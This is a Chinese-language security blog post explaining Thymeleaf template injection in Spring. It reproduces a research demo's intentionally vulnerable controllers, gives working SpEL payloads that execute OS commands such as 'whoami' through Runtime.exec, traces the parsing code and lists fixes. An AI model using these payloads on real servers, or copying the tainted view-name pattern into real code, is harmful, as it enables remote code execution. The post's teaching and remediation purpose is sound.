---
title: Thymeleaf 模板注入
date: 2023/10/28 15:00:25
categories:
- Java
tags:
- 模板注入
---

# Thymeleaf 模板介绍

Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：

1. Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。
2. Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。
3. Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。



# Thymeleaf 模板使用

依赖

```xml
 <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```

Controller

```java
@Controller
public class welcomeController {
	...
	@GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }
}
```

相关解释

> @Controller 一般应用在有返回界面的应用场景下.例如，管理后台使用了 thymeleaf 作为模板开发，需要从后台直接返回 Model 对象到前台，那么这时候就需要使用 @Controller 来注解。
>
> 控制层处理完请求，返回视图名称，从而对应模板来渲染结果，比如
>
> `return "welcome"`→`resources/templates/welcome.html`
>
> `return "/user/en/welcome"`→`resources/templates/user.en/welcome.html`

模板放在`resources/templates`中

```html
<!DOCTYPE HTML>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<div th:fragment="header">
    <h3>Spring Boot Web Thymeleaf Example</h3>
</div>
<div th:fragment="main">meleaf
    <span th:text="'welcome, ' + ${message}"></span>
</div>
</html>
```





# Thymeleaf模版注入复现

[Spring ThymeleafView](https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java)会使用表达式解析模版名称，若是将用户输入的参数拼接到模版路径中，可以造成表达式注入。

Demo代码[veracode-research/spring-view-manipulation: When MVC magic turns black (github.com)](https://github.com/veracode-research/spring-view-manipulation)

```java
@GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
```

![image-20231028113111914](../images/image-20231028113111914.png)

payload

```java
/path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x
```

其中new了一个`java.util.Scanner`对象，用于读取字符。传入Scanner中的参数为`T(java.lang.Runtime).getRuntime().exec("id").getInputStream()`

`T( )`用于访问类作用域的方法和常量，这块是关于spel表达式的

> `java.util.Scanner`是可以省略的，它在此仅用于回显，无需回显时直接`T(java.lang.Runtime).getRuntime().exec("id")`执行命令即可。

`::`在此为必须，不然不会进入表达式解析过程，并且一定得在表达式后面。

`.x`在此处可忽略（`return "user/" + lang + "/welcome";`）

解析路径的代码在[ThymeleafView:277](https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java#L277)，其中`viewTemplateName`中一定要包含`::`，不然不会进入表达式解析过程。

```java
if (!viewTemplateName.contains("::")) {
    // No fragment specified at the template name

    templateName = viewTemplateName;
    markupSelectors = null;

} else {
    // Template name contains a fragment name, so we should parse it as such

    final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);

    final FragmentExpression fragmentExpression;
    try {
        // By parsing it as a standard expression, we might profit from the expression cache
        fragmentExpression = (FragmentExpression) parser.parseExpression(context, "~{" + viewTemplateName + "}");
    } catch (final TemplateProcessingException e) {
        throw new IllegalArgumentException("Invalid template name specification: '" + viewTemplateName + "'");
    }
```

跟进`parser.parseExpression`方法，在[StandardExpressionParser](https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionParser.java#L113)中对`~{viewTemplateName}~`进行处理

```java
final String preprocessedInput =
    (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input);
```

继续跟进`StandardExpressionPreprocessor.preprocess`，在[StandardExpressionPreprocessor](https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionPreprocessor.java#L80)中，使用正则表达式将路径中的表达式提取出来。其中正则规则：`\_\_(.*?)\_\_`（表示非贪婪匹配两个`__`之间的内容），匹配得到`${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}`

![debug-preprocess](../images/debug-preprocess.png)

提取表达式之后就是根据框架进行对应的表达式解析，这里是Spring所以用的就是SpringEL表达式解析。

```java
@GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }
```

> @PathVariable 处理请求 url 路径中的参数 /user/{id}

![image-20231028114216531](../images/image-20231028114216531.png)

payload

```java
/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x.x
```

这里要注意如果要有回显的话，需要在末尾再加上一个`.x`，原因是Spring分配URI时会自动抹去后缀名，导致缺少了`.x`，无法正常回显。再加一个`.x`就能正常回显。



# 漏洞修复

### 配置ResponseBody或RestController注解

> @ResponseBody注解告诉spring不再返回视图名称，而是直接返回值

```java
@GetMapping("/safe/fragment")
@ResponseBody
public String safeFragment(@RequestParam String section) {
        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
}
```

### 通过redirect:

> 根据springboot定义，如果名称以`redirect:`开头，则不再调用`ThymeleafView`解析，调用`RedirectView`去解析`controller`的返回值

```java
 @GetMapping("/safe/redirect")
 public String redirect(@RequestParam String url) {
 return "redirect:" + url; //FP as redirects are not resolved as expressions
 }
```

### 方法参数中设置HttpServletResponse 参数

> 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP
> Response，因此不会发生视图名称解析。
>
> **这里的前提条件是`returnValue`为空，所以这种修复方法只有在返回值为空的情况下才有效。**

```java
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
	log.info("Retrieving " + document); //FP
}
```





# 总结

这个漏洞原理很简单，就是Thymeleaf的视图参数可进行表达式解析，若用户输入可控制视图参数，就会导致SpEL注入漏洞产生。

漏洞细节点是payload的构造，需要添加`__`和`::`引导表达式解析。